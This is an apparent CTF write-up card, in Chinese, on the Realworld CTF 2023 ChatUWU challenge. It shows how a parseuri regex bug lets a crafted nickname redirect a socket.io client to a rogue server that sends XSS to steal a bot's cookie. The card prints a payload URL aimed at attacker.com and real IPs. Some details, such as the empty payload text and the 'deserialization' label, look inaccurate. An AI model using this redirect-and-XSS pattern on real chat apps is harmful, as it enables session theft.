---
title: "Realworld CTF 2023 - ChatUWU 详解"
category: web
tags: ["Realworld CTF 2023", "web", "xss", "socket.io", "parseuri", "regex-bug"]
signals: ["Realworld CTF 2023 2023", "xss", "socket.io", "parseuri", "regex-bug", "dompurify", "cors", "rogue-server", "location-search", "Realworld", "CTF", "ChatUWU", "socket", "DOMPurify"]
difficulty: medium
source: "https://www.ctfiot.com/105233.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Realworld CTF 2023 - ChatUWU 详解

> 赛事：Realworld CTF 2023 2023 | 方向：web | 难度：medium

## 一句话总结

Realworld CTF 2023 ChatUWU：socket.io 聊天室 DOMPurify 0.24 房间渲染 + parseuri 正则 @host 解析错误 → 攻击者控制 socket 服务器发送 XSS payload。

## 攻击链

1. socket.io 聊天室 + DOMPurify 0.24.0 (基本无洞) 过滤 from/text
2. 前端 io(`/${location.search}`) 用 location.search 直接拼 socket URL
3. 后端: io.to(''DOMPurify'').emit(''msg'', {from, text, isHtml:true}) 才 innerHTML
4. 关键: socket.io 内部用 parseuri (https://github.com/galkn/parseuri) 解析 uri
5. 漏洞: parseuri 正则 /^(?:(?![^:@]+:[^:@/]*@)(http|https|ws|wss)://)?(...)?(@)?/ 解析 host 错误
6. payload: http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000
7. @ 后面被解析为 authority (host:port) 而非 username
8. 攻击: 部署恶意 socket.io 服务器 (cors: ''*'') + 监听 0.0.0.0:7890
9. 恶意服务器: io.to(''DOMPurify'').emit(''msg'', {from:''pankas'', text:'''', isHtml:true}) 触发 XSS
10. 实际 XSS 触发: 房间 DOMPurify + isHtml=true → innerHTML 渲染
11. 完整利用: xssbot 访问恶意 URL + 触发内联 img/iframe + 窃取 cookie

## 关键 payload

```
http://target/?room=DOMPurify&nickname=guest5279@attacker.com:9000
```

## 经验教训

socket.io + parseuri 正则 @authority 解析错误是 web 经典高阶利用；房间级 isHtml 标志是 XSS 触发点；location.search 直接拼 URL 是反序列化攻击入口。

## 标签

xss、socket.io、parseuri、regex-bug、dompurify、cors、rogue-server、location-search

## 参考来源

- https://www.ctfiot.com/105233.html
- 原文件：Realworld_CTF_2023_ChatUWU_详解.full.md
